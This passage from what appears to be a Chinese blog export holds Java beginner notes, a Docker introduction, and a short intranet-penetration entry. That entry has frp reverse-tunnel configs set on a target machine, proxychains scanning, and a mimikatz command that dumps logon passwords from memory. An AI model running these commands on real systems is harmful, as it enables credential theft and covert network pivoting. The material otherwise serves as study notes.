class="line">        <span class="keyword">if</span> (flag)&#123;</span><br><span class="line">            System.out.println(number+<span class="string">&quot;是质数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="算法练习——猜随机数"><a href="#算法练习——猜随机数" class="headerlink" title="算法练习——猜随机数"></a>算法练习——猜随机数</h3><p>随即生成1~100的随机数，并判断猜测得对不对</p>
<ul>
<li>思路：导入random包，限制随机数范围（包头不包尾，包左不包右）；<code>random.nextInt(101)</code>只能限定范围0到100，要生成1~100，可以使用<code>random.nextInt(100) + 1</code>即可生成</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">random_number</span> <span class="operator">=</span> random.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;请输入你猜测的数字：&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> s.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (number &gt; random_number)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测结果过大&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (number &lt; random_number) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测结果过小&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;生成的随机数为：&quot;</span> + random_number);</span><br><span class="line">                System.out.println(<span class="string">&quot;猜测成功&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ul>
<li>定义：一种容器，可以用来存储同种类型的不同数据</li>
</ul>
<img src="/image/image-20230219170202981.png" alt="image-20230219170202981" style="zoom:80%;" />

<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p><strong>静态初始化</strong></p>
<p>完整格式：<code>数据类型[] 数组名 = new 数据类型[] &#123;1, 2, 3&#125;</code></p>
<p>简化格式：<code>数据类型[] 数组名 =  &#123;1, 2, 3&#125;</code></p>
<p><strong>动态初始化</strong></p>
<p>完整格式：<code>数据类型[] 数组名 = new 数据类型[数组的长度];</code></p>
<p>默认初始化值：引用数据null，整数数据0，小数数据0.0，字符类型<code>\u0000</code>，布尔类型false</p>
<p><strong>区别</strong></p>
<img src="/image/image-20230219173955877.png" alt="image-20230219173955877" style="zoom: 67%;" />

<img src="/image/image-20230219174021510.png" alt="image-20230219174021510" style="zoom:67%;" />

<h3 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h3><ul>
<li>索引从0开始，访问第几个元素，索引就要减一</li>
<li>访问格式：<code>System.out.println(arr[0]);</code></li>
<li>赋值同理：<code>arr[0] = 100;</code></li>
<li>数组的长度属性调用方式：<code>数组名.length</code></li>
</ul>
<h3 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(arr1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="数组的常见操作"><a href="#数组的常见操作" class="headerlink" title="数组的常见操作"></a>数组的常见操作</h3><p><strong>求最值</strong></p>
<ul>
<li>思路：遍历数组获取每一个元素；定义max变量依次与每个元素比较，如果比max大则用max记录；max的值应该是数组里的值，否则如果全是负数，最终获取到的值可能是0；</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr1[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr1[i] &gt; max)&#123;</span><br><span class="line">                max = arr1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;数组中的最大值是：&quot;</span> + max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>遍历随机数数组求和</strong></p>
<ul>
<li>思路：先定义并动态初始化一个数组；循环生成十个随机数，依次遍历数组元素并赋值；定义sum变量循环求和</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            arr1[i] = r.nextInt(<span class="number">100</span>) + <span class="number">1</span>;</span><br><span class="line">            System.out.println(arr1[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            sum = sum + arr1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;10个随机数的和为：&quot;</span> + sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>遍历随机数数组求平均值</strong></p>
<ul>
<li>思路：在求和的基础上除以数组的长度</li>
</ul>
<p><strong>求数组中小于平均值的数据个数</strong></p>
<p>- </p>
<ul>
<li>思路：定义一个count变量，循环，如果比平均值小，则count++，最后打印count</li>
</ul>
<p><strong>交换数组首尾索引对应的元素</strong></p>
<ul>
<li>思路：定义两个变量<code>i = 0,j = arr1.length - 1;</code>先交换首尾（索引为0和索引为数组长度-1），再交换第二个和倒数第二个（索引为1和索引为数组长度-2），此时i++，j–，直到i不再小于j为止；最后遍历数组打印出来即可</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>,j = arr1.length - <span class="number">1</span>; i &lt; j; i++, j--)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr1[i];</span><br><span class="line">            arr1[i] = arr1[j];</span><br><span class="line">            arr1[j] = temp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            System.out.print(arr1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="数组地址值"><a href="#数组地址值" class="headerlink" title="数组地址值"></a>数组地址值</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="type">double</span> [] arr2 = &#123;<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>&#125;;</span><br><span class="line">        System.out.println(arr1);</span><br><span class="line">        System.out.println(arr2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230219171307310.png" alt="image-20230219171307310"></p>
<ul>
<li>[：代表该地址是个数组类型</li>
<li>I，D：i代表int类型，d代表double类型</li>
<li>@：间隔符号</li>
<li>最后的八位：数组真正的十六进制地址值</li>
</ul>
<h3 id="数组的内存"><a href="#数组的内存" class="headerlink" title="数组的内存"></a>数组的内存</h3><p><strong>Java内存分配</strong></p>
<img src="/image/image-20230219182820645.png" alt="image-20230219182820645" style="zoom:67%;" />

<img src="/image/image-20230219183142034.png" alt="image-20230219183142034" style="zoom: 67%;" />

<p>例：</p>
<img src="/image/image-20230221162007028.png" alt="image-20230221162007028" style="zoom: 67%;" />

<ul>
<li>流程：首先定义main方法时载入栈内存，通过<code>int[] arr</code>定义一个数组，可以记录一个int数组的<strong>地址值</strong>，而直接定义变量记录的是<strong>真实的数据</strong>，因此我们使用输出语句直接打印arr时，输出的只是int数组的地址值；new关键字则在<strong>堆内存</strong>中创建一段内存，通过赋值运算符，将这一段内存地址值赋值给刚刚的arr数组；最后通过arr的索引，先找到arr数组记录的地址，再通过索引找到堆内存中对应地址的数据值：<code>arr[0] -&gt; [I10f87f48[0] -&gt; 0</code></li>
</ul>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul>
<li>方法是程序中最小的执行单元</li>
</ul>
<h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><img src="/image/image-20230221172741216.png" alt="image-20230221172741216" style="zoom:80%;" />

<ul>
<li>同一个类中，方法名相同，参数不同（个数，类型，顺序）的方法都构成重载关系，与返回值无关</li>
</ul>
<h3 id="方法的内存"><a href="#方法的内存" class="headerlink" title="方法的内存"></a>方法的内存</h3><img src="/image/image-20230221175613578.png" alt="image-20230221175613578" style="zoom:80%;" />

<ul>
<li>先进栈的方法后出栈</li>
</ul>
<p><strong>方法传递基本数据类型的内存原理</strong></p>
<img src="/image/image-20230221180410264.png" alt="image-20230221180410264" style="zoom:80%;" />

<p><strong>方法传递引用数据类型的内存原理</strong></p>
<img src="/image/image-20230221180612487.png" alt="image-20230221180612487" style="zoom: 67%;" />

<p><strong>区别</strong></p>
<img src="/image/image-20230221180757255.png" alt="image-20230221180757255" style="zoom:80%;" />

<h3 id="方法的值传递"><a href="#方法的值传递" class="headerlink" title="方法的值传递"></a>方法的值传递</h3><img src="/image/image-20230221181109536.png" alt="image-20230221181109536" style="zoom:80%;" />

<ul>
<li>方法传递基本数据类型时，传递的是真实的数据，形参改变不影响实参的值（因为每个方法使用的都是独立的栈内存，方法执行完毕就出栈，不影响其他方法栈内存里的值）</li>
</ul>
<img src="/image/image-20230221181852197.png" alt="image-20230221181852197" style="zoom:80%;" />

<ul>
<li>方法传递引用数据类型是，传递的是地址值，真正改变的是堆内存中的值，如果有另一个方法也调用了这个地址，那么结果就会受影响（例如<code>main.arr[0] -&gt; I[@001[0] -&gt; 200</code>，则<code>change.arr[0] -&gt; I[@001[0] -&gt; 200</code>）</li>
</ul>
<h2 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h2><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><img src="/image/image-20230227151820873.png" alt="image-20230227151820873" style="zoom:80%;" />

<h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><img src="/image/image-20230227154046977.png" alt="image-20230227154046977" style="zoom:80%;" />

<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><ul>
<li>对象代表什么，就得封装对应的数据，并提供数据相对应的行为</li>
</ul>
<img src="/image/image-20230228165257649.png" alt="image-20230228165257649" style="zoom:80%;" />

<ul>
<li>例如String对象，封装了<code>.length()</code>，<code>.toUpperCase()</code>等方法，可以直接调用：<code>String s = &quot;abcd&quot;; sout(s.length()); -&gt; 4</code></li>
</ul>
<h4 id="private关键字"><a href="#private关键字" class="headerlink" title="private关键字"></a>private关键字</h4><ul>
<li>权限修饰符，只有所在类可以访问</li>
</ul>
<h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h4><img src="/image/image-20230306172427491.png" alt="image-20230306172427491" style="zoom:80%;" />

<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><ul>
<li>在创建对象的时候给成员变量进行赋值</li>
</ul>
<img src="/image/image-20230306191311284.png" alt="image-20230306191311284" style="zoom:80%;" />

<img src="/image/image-20230306191334544.png" alt="image-20230306191334544" style="zoom:80%;" />

<ul>
<li>如果没有写任何构造方法，虚拟机会自动加上一个空参构造方法（看不到），如果已经定义了构造方法，那么虚拟机将不再构造，无法再调用无参构造方法，如需无参构造方法则需要自行定义</li>
</ul>
<img src="/image/image-20230306192039345.png" alt="image-20230306192039345" style="zoom: 67%;" />

<ul>
<li>带参数的构造方法和无参的构造方法，方法名相同，参数不同，称作构造方法的重载</li>
<li>系统会根据参数的个数自动选择重载方法</li>
</ul>
<img src="/image/image-20230306193322365.png" alt="image-20230306193322365" style="zoom: 67%;" />

<h3 id="标准JavaBean类"><a href="#标准JavaBean类" class="headerlink" title="标准JavaBean类"></a>标准JavaBean类</h3><img src="/image/image-20230306200432755.png" alt="image-20230306200432755" style="zoom:80%;" />

<p><strong>主类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.JavaStudy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javaStudy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Y5neKO&quot;</span>, <span class="string">&quot;男&quot;</span>, <span class="number">21</span>);</span><br><span class="line">        u.setName(<span class="string">&quot;YS_Neko&quot;</span>);</span><br><span class="line">        System.out.println(u.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>User类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.JavaStudy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空参构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;空参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//带全部参数的构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, String sex, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get和set方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对象的内存图"><a href="#对象的内存图" class="headerlink" title="对象的内存图"></a>对象的内存图</h3><ul>
<li>创建对象时的过程：</li>
</ul>
<p><code>加载class字节码 -&gt; 申明局部变量 -&gt; 在堆内存中开辟一块空间 -&gt; 默认初始化 -&gt; 显示初始化 -&gt; 构造方法初始化 -&gt; 将堆内存中的地址值赋值给栈内存中的局部变量</code></p>
<p><strong>一个对象的内存图</strong></p>
<img src="/image/image-20230306202651668.png" alt="image-20230306202651668" style="zoom: 67%;" />

<h3 id="this的内存图"><a href="#this的内存图" class="headerlink" title="this的内存图"></a>this的内存图</h3><ul>
<li>本质：代表方法调用者本身的地址值</li>
</ul>
<h3 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h3><ul>
<li>成员变量：在类中且在方法外的变量</li>
<li>局部变量：方法中的变量</li>
</ul>
<p><strong>区别</strong></p>
<img src="/image/image-20230306204031334.png" alt="image-20230306204031334" style="zoom:80%;" />
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Java</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透笔记</title>
    <url>/2023/02/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内网渗透总结"><a href="#内网渗透总结" class="headerlink" title="内网渗透总结"></a>内网渗透总结</h1><h2 id="代理方法"><a href="#代理方法" class="headerlink" title="代理方法"></a>代理方法</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote>
<p>下载链接：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
</blockquote>
<h4 id="frp工作原理拓扑图"><a href="#frp工作原理拓扑图" class="headerlink" title="frp工作原理拓扑图"></a>frp工作原理拓扑图</h4><img src="/image/frp拓扑.jpg" alt="frp拓扑" style="zoom: 50%;" />

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在使用frp之前，首先要对服务端和客户端配置文件（frps.ini &amp; frpc.ini）进行配置</p>
<p>服务端（有公网的机器）：frps.ini</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 以下为web页面，可不配置</span></span><br><span class="line"><span class="comment"># IP 与 bind_addr 默认相同，可以不设置</span></span><br><span class="line">dashboard_addr = 0.0.0.0</span><br><span class="line"><span class="comment"># 端口必须设置，只有设置web页面才生效</span></span><br><span class="line">dashboard_port = 7001</span><br><span class="line"><span class="comment"># 用户密码</span></span><br><span class="line">dashboard_user = y5neko</span><br><span class="line">dashboard_pwd = y5neko</span><br><span class="line"><span class="comment"># 允许客户端绑定的端口</span></span><br><span class="line">allow_ports = 40000-50000</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">服务端启动：./frps -c frps.ini</span><br><span class="line">后台启动：<span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>

<p>客户端（目标机）：frpc.ini</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"><span class="comment"># 服务端ip</span></span><br><span class="line">server_addr = your vps addr</span><br><span class="line"><span class="comment"># 端口，与frps同步</span></span><br><span class="line">server_port = 7000   </span><br><span class="line">tls_enable = <span class="literal">true</span></span><br><span class="line">pool_count = 5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># socks代理模块</span></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line"><span class="comment"># socks5端口</span></span><br><span class="line">remote_port = 14512</span><br><span class="line">plugin = socks5</span><br><span class="line"><span class="comment"># socks5账号密码</span></span><br><span class="line">plugin_user = y5neko</span><br><span class="line">plugin_passwd = y5neko</span><br><span class="line">use_encryption = <span class="literal">true</span></span><br><span class="line">use_compression = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">客户端启动：./frpc -c frpc.ini &amp;</span><br><span class="line">后台启动：<span class="built_in">nohup</span> ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>

<h2 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h2><h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><blockquote>
<p>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
</blockquote>
<img src="/image/image-20201222191729011.png" alt="image-20201222191729011" style="zoom:50%;" />

<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置文件 &#x3D;&gt; 代理服务器</p>
<img src="/image/image-20201222191818678.png" alt="image-20201222191818678" style="zoom:67%;" />

<p>选中默认的代理服务器配置</p>
<img src="/image/image-20201222191844133.png" alt="image-20201222191844133" style="zoom:67%;" />

<p>填写建立的socks代理配置</p>
<img src="/image/image-20201222191912992.png" alt="image-20201222191912992" style="zoom:67%;" />

<p>检测连接成功后，右键通过Proxifier代理打开即可</p>
<img src="/image/image-20201222193544608.png" alt="image-20201222193544608" style="zoom:67%;" />

<h3 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h3><blockquote>
<p>一款命令行代理神器，kali3以上默认自带。</p>
<p>ps：proxychains不支持UDP和ICMP</p>
<img src="/image/image-20201222194252608.png" alt="image-20201222194252608" style="zoom:80%;" />
</blockquote>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>修改配置文件，文件位置为 <strong>&#x2F;etc&#x2F;proxychains.conf</strong></p>
<p>用vi修改，找到 <strong>[ProxyList]</strong></p>
<p>修改内容为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># 代理方式以及配置</span></span><br><span class="line">socks5 ip_addr port username password</span><br></pre></td></tr></table></figure>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxyresolv 127.0.0.1					<span class="comment"># 检测连接</span></span><br><span class="line">proxychains nmap -sT -Pn 127.0.0.1		 <span class="comment"># 通过socks代理执行命令，不支持UDP及ICMP，使用TCP扫描</span></span><br></pre></td></tr></table></figure>

<img src="/image/image-20201222195139006.png" alt="image-20201222195139006" style="zoom:80%;" />

<h2 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>无需tty读取明文密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20201222183945385.png" alt="image-20201222183945385" style="zoom: 50%;" />]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux运维疑难杂症</title>
    <url>/2023/03/29/Linux%E8%BF%90%E7%BB%B4%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/</url>
    <content><![CDATA[<h1 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h1><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。</p>
<p>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个<a href="https://opensource.com/article/18/1/history-low-level-container-runtimes">保护层</a>。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与底层系统的隔离。</p>
<p>由于容器是进程级别的，相比虚拟机有很多优势。</p>
<p><strong>①启动快：</strong>容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。</p>
<p><strong>②资源占用少：</strong>容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。</p>
<p><strong>③体积小：</strong>容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件要小很多。</p>
<p>总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多。</p>
<p><strong>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。</strong>它是目前最流行的 Linux 容器解决方案。</p>
<p>Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。</p>
<p>总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。</p>
